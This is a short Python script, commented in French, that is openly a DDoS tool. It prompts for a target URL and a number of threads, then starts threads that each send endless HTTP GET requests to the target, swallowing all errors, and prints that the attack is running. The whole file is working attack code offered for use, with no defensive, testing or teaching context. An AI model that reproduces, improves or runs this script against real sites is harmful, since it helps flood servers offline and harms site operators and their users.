from threading import Thread
import time

import requests

class Ddos(Thread):
    """Thread chargé de lancer des requetes en boucle sur le site web"""

    def __init__(self, url):
        Thread.__init__(self)
        self.url = url

    def run(self):
        """Code à exécuter pendant l'exécution du thread."""
        while 1:
            try:
                requests.get(self.url)
            except:
                pass


if __name__ == "__main__":

    url = input("Merci d'entrée l'url à DDOS exemple: https://siteweb.fr => ")
    numberthread = int(input("Merci d'entrée le nombre de de connexion simultané au site web => "))

    i=0
    mydict ={}

    while 1:
        if i < numberthread:
            mydict["thread"+str(i)] = Ddos(url)
            mydict["thread"+str(i)].start()
            print("création du thread numéro:", i)
            i +=1
            time.sleep(5)
        elif i == numberthread:
            print("tous les threads sont créer l'attaque est en cours")
            i +=1
        else:
            time.sleep(10)
            print("Attaque ddos en cours")
            print("CTRL + C pour arreter l'attaque")

        


